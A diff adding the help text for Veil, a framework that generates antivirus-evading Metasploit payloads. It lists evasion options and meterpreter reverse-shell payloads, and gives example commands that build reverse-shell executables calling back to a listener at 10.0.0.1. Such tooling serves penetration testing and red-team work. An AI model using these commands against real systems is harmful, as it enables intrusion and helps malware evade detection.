@@ -1,0 +1,32 @@
+Veil - Payload Generation Framework
+
+Usage: veil [options]
+
+Generate AV-evading Metasploit-compatible payloads.
+
+Options:
+  -t, --tool=TOOL     Tool to use (Evasion, Ordnance, etc.)
+  -p, --payload=PAY   Payload name (e.g., cs/meterpreter/rev_tcp.py)
+  -o, --output=FILE   Output file path
+  -l, --listener=PAY  Listener payload type
+  --ip=ADDR           Listener IP address
+  --port=PORT         Listener port
+  --msfvenom          Use msfvenom for payload generation
+  --no-msfvenom       Disable msfvenom payload generation
+  -c, --config=FILE   Config file path
+  -v, --verbose       Verbose output
+  --encrypt=METHOD    Encryption method (xor, aes, etc.)
+  --evasion=TECH      Evasion technique
+  -h, --help          Show this help message
+
+Evasion Payloads:
+  cs/meterpreter/rev_tcp.py
+  cs/meterpreter/rev_http.py
+  cs/meterpreter/rev_https.py
+  cs/shellcode/self_inject.py
+  cs/shellcode/virtual.py
+
+Example:
+  veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 10.0.0.1 --port 4444
+  veil -t Evasion -p cs/meterpreter/rev_https.py --ip 10.0.0.1 --port 443 -o payload.exe
+  veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 10.0.0.1 --port 4444 --evasion syscalls
